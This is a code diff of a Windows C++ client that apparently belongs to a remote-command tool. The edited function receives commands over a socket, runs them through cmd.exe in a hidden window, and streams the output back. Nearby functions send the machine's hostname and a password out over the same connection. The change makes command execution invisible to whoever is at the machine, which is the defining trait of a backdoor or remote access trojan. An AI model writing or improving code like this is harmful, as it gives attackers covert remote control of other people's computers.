@@ -30,27 +30,61 @@ void active_ansi()
 
 static void exec_cmd_and_send(SOCKET sock, char *cmd)
 {
-    FILE *fp;
+    HANDLE hRead, hWrite;
+    SECURITY_ATTRIBUTES sa;
+    PROCESS_INFORMATION pi;
+    STARTUPINFO si;
     char buffer[1024];
-    char full_cmd[1100];
+    DWORD bytesRead;
 
-    cmd[strcspn(cmd, "\r\n")] = '\0';
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.lpSecurityDescriptor = NULL;
+    sa.bInheritHandle = TRUE;
 
-    snprintf(full_cmd, sizeof(full_cmd), "cmd /c %s 2>&1", cmd);
-    printf("[EXEC] %s\n", cmd);
-
-    fp = _popen(full_cmd, "r");
-    if (!fp)
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
         return;
 
-    while (fgets(buffer, sizeof(buffer), fp))
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+
+    ZeroMemory(&pi, sizeof(pi));
+
+    std::string command = "cmd.exe /c ";
+    command += cmd;
+
+    if (!CreateProcess(
+        NULL,
+        (LPSTR)command.c_str(),
+        NULL,
+        NULL,
+        TRUE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        &si,
+        &pi))
     {
-        send(sock, buffer, strlen(buffer), 0);
+        CloseHandle(hRead);
+        CloseHandle(hWrite);
+        return;
+    }
+
+    CloseHandle(hWrite);
+
+    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
+    {
+        buffer[bytesRead] = '\0';
+        send(sock, buffer, bytesRead, 0);
     }
 
     send(sock, "[END]\n", 6, 0);
 
-    _pclose(fp);
+    CloseHandle(hRead);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 }
 
 static void send_hostname(SOCKET sock)
@@ -79,6 +113,8 @@ static void send_pass(SOCKET sock, std::string password)
     Sleep(1000);
     send(sock, pass.c_str(), pass.size(), 0);
 }
+
+//taskkill /IM client_no_console.exe /F
 
 int main()
 {
